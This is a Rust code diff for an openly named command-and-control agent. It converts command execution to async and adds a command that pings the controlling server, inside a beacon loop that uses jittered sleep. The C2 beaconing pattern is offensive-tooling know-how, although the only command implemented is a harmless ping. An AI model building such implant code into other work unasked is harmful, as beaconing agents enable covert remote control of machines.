@@ -92,7 +92,7 @@ impl C2Agent {
             self.send_beacon().await?;
 
             // Actions
-            self.execute_commands();
+            self.execute_commands().await?;
             self.clear_commands();
 
             // Calculate sleep duration with jitter
@@ -108,7 +108,6 @@ impl C2Agent {
 
     /// Send beacon to get information from server
     pub async fn send_beacon(&mut self) -> Result<(), Box<dyn std::error::Error>> {
-        let mut new_command_count = 0;
         let beacon_url = format!("{}/agent/beacon", self.agent_config.server_url);
         let request_body = json!({
             "name": self.agent_config.name,
@@ -137,11 +136,11 @@ impl C2Agent {
     }
 
     /// Execute commands
-    pub fn execute_commands(&self) -> Result<(), Box<dyn std::error::Error>> {
+    pub async fn execute_commands(&self) -> Result<(), Box<dyn std::error::Error>> {
         for command in self.commands.iter() {
             match command.command_id {
                 0 => {
-                    println!("i'm pinging da server")
+                    self.pingc2().await;
                 },
                 _ => {
                     println!("don't understand command")
@@ -155,6 +154,15 @@ impl C2Agent {
     /// Clear commands member after execution
     pub fn clear_commands(&mut self) -> () {
         self.commands = Vec::new();
+    }
+
+    /* Commands */
+    pub async fn pingc2(&self) -> () {
+        let ping_url = format!("{}/agent/ping", self.agent_config.server_url);
+
+        if let Err(e) = self.http_client.get(ping_url).send().await {
+            eprintln!("C2 ping failed: {e}");
+        }
     }
 }
 
